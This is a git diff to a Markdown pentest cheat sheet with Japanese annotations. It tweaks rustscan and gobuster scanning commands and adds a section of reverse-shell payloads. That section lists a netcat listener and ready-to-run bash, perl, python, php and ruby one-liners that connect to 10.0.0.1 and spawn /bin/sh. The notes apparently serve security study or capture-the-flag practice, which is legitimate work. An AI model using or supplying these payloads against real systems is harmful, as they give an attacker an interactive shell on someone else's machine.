@@ -8,11 +8,11 @@
 
 ### rustscan
 - installation: `sudo snap install -y rustscan`
-- 全ポートスキャン: `rustscan -a $IP --ulimit 20000 -- -Pn -A --script vuln > rustscan.log`
+- 全ポートスキャン: `rustscan -a $IP --ulimit 10000 -- -Pn -A --script vuln > rustscan.log`
 
 ### gobuster
-- ディレクトリ
-  - 
+- ディレクトリやファイルの探索
+  - `gobuster -u http://$IP -w ~/tools/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50`
 
 ## Password Cracking
 ### hydra
@@ -63,6 +63,19 @@
 
 
 ## Reverse shells
+### Receiver
+- `nc -lnvp 4444`
+
+### sender
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
+- perl: `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+- python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+- php: `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
+- ruby: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+
+
+## Miscellaneous
 ### SimpleHTTPserver
 - カレントディレクトリをルートとした簡易Webサーバを立てることができる．
   - ```sudo python -m SimpleHTTPServer [port]```
